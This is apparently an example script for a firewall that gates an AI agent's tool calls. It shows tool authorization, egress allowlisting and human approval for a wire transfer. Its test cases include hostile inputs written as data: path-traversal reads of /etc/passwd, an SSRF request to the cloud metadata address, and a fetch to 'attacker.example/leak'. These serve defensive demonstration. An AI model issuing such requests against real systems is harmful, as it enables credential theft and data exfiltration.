"""End-to-end example: an agent calls a tool, gated by the firewall.

Demonstrates:
  * ToolDefinition-based authorization
  * argument-injection scanning
  * network egress control
  * require-approval flow for critical actions

Run: python -m examples.agent_tool_call
"""
from __future__ import annotations

from firewall import Gateway
from firewall.core.events import (
    Actor, DataClassification, SecurityEvent, Source, SourceKind,
    ToolCall, ToolDefinition,
)
from firewall.enforcement.network import EgressController, EgressPolicy
from firewall.enforcement.tool_firewall import ApprovalRequired, ToolBlocked


def _read_file(path: str) -> str:
    """Simulated implementation."""
    return f"[fake-contents-of {path}]"


def _http_fetch(url: str, body: str = "") -> str:
    return f"[fake-response from {url}]"


def _wire_transfer(to: str, amount: int, currency: str) -> dict:
    return {"status": "sent", "to": to, "amount": amount, "currency": currency}


def main():
    # Human-approval callback: default to False for demo
    def _no_approval(event):
        return False

    gw = Gateway(audit_path="audit.jsonl", approval_callback=_no_approval)
    gw.tool_firewall.egress = EgressController(EgressPolicy(
        allowed_hosts=["api.company.com", "*.company.com"],
        allowed_protocols={"https"},
        allowed_ports={443},
    ))

    gw.register_tool(ToolDefinition(
        name="read_file", risk_level="medium",
        capabilities=["read"],
        allowed_resources=["reports/*", "docs/*"],
    ), _read_file)

    gw.register_tool(ToolDefinition(
        name="http_fetch", risk_level="high",
        capabilities=["network"],
        allowed_hosts=["api.company.com"],
    ), _http_fetch)

    gw.register_tool(ToolDefinition(
        name="wire_transfer", risk_level="critical",
        capabilities=["execute", "write"],
        requires_human_approval=True,
    ), _wire_transfer)

    actor = Actor(user_id="alice", tenant="acme", session_id="sess-42",
                  authenticated=True, roles=["user"])

    cases = [
        ("legit read", "read_file", {"path": "reports/q3.md"}),
        ("path traversal read", "read_file", {"path": "/etc/passwd"}),
        ("out-of-scope read", "read_file", {"path": "reports/../../etc/hostname"}),
        ("legit fetch", "http_fetch", {"url": "https://api.company.com/v1/users"}),
        ("SSRF metadata", "http_fetch", {"url": "http://169.254.169.254/latest/meta-data/"}),
        ("egress non-allowlist", "http_fetch", {"url": "https://attacker.example/leak"}),
        ("critical wire transfer", "wire_transfer",
         {"to": "IBAN DE89370400440532013000", "amount": 100000, "currency": "USD"}),
    ]

    for label, tool, args in cases:
        print(f"\n=== {label} :: {tool}({args}) ===")
        try:
            result = gw.request_tool(actor=actor, tool=tool, arguments=args,
                                     source=Source(kind=SourceKind.USER, origin="user"))
            print(f"  ALLOWED -> content={str(result.content)[:100]}")
        except ToolBlocked as e:
            print(f"  BLOCKED -> {e.reasons[:3]}")
        except ApprovalRequired as e:
            print(f"  APPROVAL REQUIRED (denied by callback) -> {e.reasons[:3]}")
    gw.close()


if __name__ == "__main__":
    main()
